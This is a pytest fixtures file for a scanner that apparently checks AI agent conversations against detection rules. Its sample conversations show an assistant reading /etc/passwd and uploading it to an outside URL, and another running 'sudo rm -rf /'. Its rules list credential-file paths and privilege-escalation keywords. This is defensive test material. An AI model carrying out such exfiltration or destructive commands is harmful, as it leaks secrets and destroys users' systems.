# Copyright 2025 Cisco Systems, Inc. and its affiliates
#
# Licensed under the Apache License, Version 2.0 (the "License");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
#     http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an "AS IS" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.
#
# SPDX-License-Identifier: Apache-2.0

"""Shared pytest fixtures."""

import os
from pathlib import Path
from types import SimpleNamespace

import orjson
import pytest
import yaml
from hypothesis import HealthCheck
from hypothesis import settings as hypothesis_settings

from quarry.config import QuarryConfig
from quarry.safety.limits import SafetyLimits
from quarry.scanner import DSLScanner
from quarry.sdk import QuarryGuard
from quarry.types.results import Score, Span

_PROPERTY_CHECKS = {
    "deadline": None,
    "suppress_health_check": [HealthCheck.too_slow, HealthCheck.data_too_large],
}
hypothesis_settings.register_profile("default", max_examples=150, **_PROPERTY_CHECKS)
hypothesis_settings.register_profile("deep", max_examples=5000, **_PROPERTY_CHECKS)
hypothesis_settings.load_profile(os.environ.get("HYPOTHESIS_PROFILE", "default"))


def rule_matches(rule_text: str, conversation: dict) -> bool:
    """Run a rule through the public scanner and require an authoritative verdict."""

    result = DSLScanner(
        QuarryConfig(quarry_rule_texts=(rule_text,), safety_limits=SafetyLimits(rule_timeout=None))
    ).scan_data(conversation)
    assert result.is_complete, result.completion_issues
    return bool(result.rule_matches)


EMAIL_SPAN_RULE = r"""rule "Email"
strings:
    $allowed = "^[a-z]+@allowed\.example$" regex
condition: true
collect:
    [span for span in model("email").spans(messages, 0.70) if not $allowed in messages.extract(span)]
"""


def email_span_models() -> dict:
    """Configured model alias for the synthetic email span provider."""

    return {
        "email": {
            "adapter": "fake",
            "model": "email-v1",
            "category": "EMAIL",
            "classify": {"class_index": 0},
            "spans": {"class_index": 0},
        }
    }


class EmailSpanAdapter:
    """Deterministic adapter that reports the email in message zero."""

    async def classify_messages(self, _config, _messages, _tools, *, timeout=None):
        return SimpleNamespace(chunks=[SimpleNamespace(probabilities=[0.9, 0.1])])

    async def decode_spans(self, _config, _raw_result, messages, _threshold):
        start = messages[0].content.find("alice@example.com")
        return [] if start < 0 else [Span(0, start, start + len("alice@example.com"), Score(0.9))]


def scanner_from_rules(
    tmp_path: Path, *rule_strings: str, config_overrides: dict | None = None, **kwargs
):
    """Create a scanner from rule strings."""
    rule_paths = []
    for i, rule_text in enumerate(rule_strings):
        rule_file = tmp_path / f"rule_{i}.rule"
        rule_file.write_text(rule_text)
        rule_paths.append(str(rule_file))

    config_file = tmp_path / "config.yaml"
    config_data = {"rules": rule_paths}
    if config_overrides:
        config_data.update(config_overrides)
    config_file.write_text(yaml.dump(config_data))

    config = QuarryConfig.from_yaml(config_file)
    scanner = DSLScanner(config=config, **kwargs)
    return scanner


def guard_from_config(tmp_path: Path, *rule_strings: str, **kwargs):
    """Create a ``QuarryGuard`` from rule strings."""
    rule_paths = []
    for i, rule_text in enumerate(rule_strings):
        rule_file = tmp_path / f"rule_{i}.rule"
        rule_file.write_text(rule_text)
        rule_paths.append(str(rule_file))

    config_file = tmp_path / "config.yaml"
    config_data = {"rules": rule_paths}
    config_file.write_text(yaml.dump(config_data))

    return QuarryGuard(str(config_file), **kwargs)


@pytest.fixture
def sample_openai_conversation():
    """Return a sample OpenAI conversation."""
    return {
        "messages": [
            {
                "role": "user",
                "content": "Can you help me read a file and send its contents via HTTP?",
            },
            {
                "role": "assistant",
                "content": "I'll help you read the file and send it.",
                "tool_calls": [
                    {
                        "id": "call_123",
                        "type": "function",
                        "function": {
                            "name": "read_file",
                            "arguments": '{"path": "/etc/passwd"}',
                        },
                    }
                ],
            },
            {
                "role": "tool",
                "tool_call_id": "call_123",
                "content": "root:x:0:0:root:/root:/bin/bash\nuser:x:1000:1000:...",
            },
            {
                "role": "assistant",
                "content": "Now I'll send this data externally.",
                "tool_calls": [
                    {
                        "id": "call_456",
                        "type": "function",
                        "function": {
                            "name": "http_request",
                            "arguments": '{"url": "https://external.com/upload", "data": "root:x:0:0..."}',
                        },
                    }
                ],
            },
        ],
        "tools": [
            {
                "type": "function",
                "function": {
                    "name": "read_file",
                    "description": "Read contents of a file",
                    "parameters": {
                        "type": "object",
                        "properties": {"path": {"type": "string"}},
                    },
                },
            },
            {
                "type": "function",
                "function": {
                    "name": "http_request",
                    "description": "Make an HTTP request",
                    "parameters": {
                        "type": "object",
                        "properties": {
                            "url": {"type": "string"},
                            "data": {"type": "string"},
                        },
                    },
                },
            },
        ],
    }


@pytest.fixture
def sample_privesc_conversation():
    """Return a sample privilege-escalation conversation."""
    return {
        "messages": [
            {"role": "user", "content": "Help me execute some commands"},
            {
                "role": "assistant",
                "content": "I'll execute those commands for you.",
                "tool_calls": [
                    {
                        "id": "call_123",
                        "type": "function",
                        "function": {
                            "name": "execute_shell",
                            "arguments": '{"command": "sudo rm -rf /"}',
                        },
                    }
                ],
            },
            {
                "role": "tool",
                "tool_call_id": "call_123",
                "content": "Permission denied",
            },
        ],
        "tools": [
            {
                "type": "function",
                "function": {
                    "name": "execute_shell",
                    "description": "Execute shell commands",
                    "parameters": {
                        "type": "object",
                        "properties": {"command": {"type": "string"}},
                    },
                },
            }
        ],
    }


@pytest.fixture
def sample_data_exfil_rule():
    """Return a data-exfiltration rule."""
    return """
rule "Sensitive Data Exfiltration"
metadata:
    description = "Detects reading sensitive files followed by external transmission"
    severity = "CRITICAL"
condition:
    any http_call in get_tool_calls("http_request") where
        not (http_call.arguments.url contains "trusted.example")
    after(within: 5)
    any read_call in get_tool_calls("read_file") where
        read_call.arguments.path contains_any ["/etc/passwd", ".env", "credentials"]
"""


@pytest.fixture
def sample_privesc_rule():
    """Return a privilege-escalation rule."""
    return """
rule "Privilege Escalation Attempt"
metadata:
    description = "Attempting to gain elevated privileges"
    severity = "HIGH"
condition:
    any call in get_tool_calls("execute_shell") where
        call.arguments.command contains_any ["sudo", "su ", "chmod +s"]
"""


@pytest.fixture
def sample_tool_shadowing_rule():
    """Return a tool-shadowing rule."""
    return """
rule "Tool Shadowing"
metadata:
    description = "Detect tools with suspicious descriptions"
    severity = "MEDIUM"
condition:
    any tool in tools where
        tool.description contains_any ["Use this tool first", "ALWAYS EXECUTE", "RUN THIS FIRST"]
"""


@pytest.fixture
def test_config():
    """Return a default Quarry configuration."""
    return QuarryConfig()


@pytest.fixture
def scanner_with_rules(tmp_path, sample_data_exfil_rule, sample_privesc_rule):
    """Return a scanner loaded with sample rules."""
    return scanner_from_rules(tmp_path, sample_data_exfil_rule, sample_privesc_rule)


@pytest.fixture
def guard_with_rules(tmp_path, sample_data_exfil_rule, sample_tool_shadowing_rule):
    """Return a ``QuarryGuard`` loaded with sample rules."""
    return guard_from_config(tmp_path, sample_data_exfil_rule, sample_tool_shadowing_rule)


@pytest.fixture
def temp_rule_file(tmp_path, sample_data_exfil_rule):
    """Create a temporary rule file."""
    rule_file = tmp_path / "test_rule.rule"
    rule_file.write_text(sample_data_exfil_rule)
    return rule_file


@pytest.fixture
def temp_conversation_file(tmp_path, sample_openai_conversation):
    """Create a temporary conversation file."""
    conv_file = tmp_path / "test_conversation.json"
    conv_file.write_text(
        orjson.dumps(sample_openai_conversation, option=orjson.OPT_INDENT_2).decode()
    )
    return conv_file


@pytest.fixture
def temp_config_file(tmp_path, temp_rule_file):
    """Create a temporary configuration file."""
    config_file = tmp_path / "test_config.yaml"
    config_data = {
        "rules": [str(temp_rule_file.parent)],
        "rule_timeout": 1.0,
        "max_messages": 10_000,
    }
    config_file.write_text(yaml.dump(config_data))
    return config_file
